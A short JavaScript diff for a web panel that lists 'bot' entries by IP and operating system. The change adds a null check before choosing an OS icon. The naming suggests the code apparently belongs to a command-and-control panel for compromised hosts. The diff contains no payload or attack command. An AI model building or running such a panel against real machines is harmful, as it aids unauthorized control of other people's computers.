@@ -23,17 +23,19 @@ function clients_list(){
                     e.preventDefault();
                     $('.modal-title').html(bot.IP);
                     var symbol = "fa-question";
-                    if (bot.OS.toLowerCase().indexOf("linux") >= 0){
-                        symbol = "fa-linux";
-                    }
-                    if (bot.OS.toLowerCase().indexOf("unix") >= 0){
-                        symbol = "fa-terminal";
-                    }
-                    if (bot.OS.toLowerCase().indexOf("windows") >= 0){
-                        symbol = "fa-windows";
-                    }
-                    if (bot.OS.toLowerCase().indexOf("mac") >= 0){
-                        symbol = "fa-apple";
+                    if (bot.OS){
+                        if (bot.OS.toLowerCase().indexOf("linux") >= 0){
+                            symbol = "fa-linux";
+                        }
+                        if (bot.OS.toLowerCase().indexOf("unix") >= 0){
+                            symbol = "fa-terminal";
+                        }
+                        if (bot.OS.toLowerCase().indexOf("windows") >= 0){
+                            symbol = "fa-windows";
+                        }
+                        if (bot.OS.toLowerCase().indexOf("mac") >= 0){
+                            symbol = "fa-apple";
+                        }
                     }
                     $('#cmdip').val(bot.IP);
                     $('#intip').val(bot.IP);
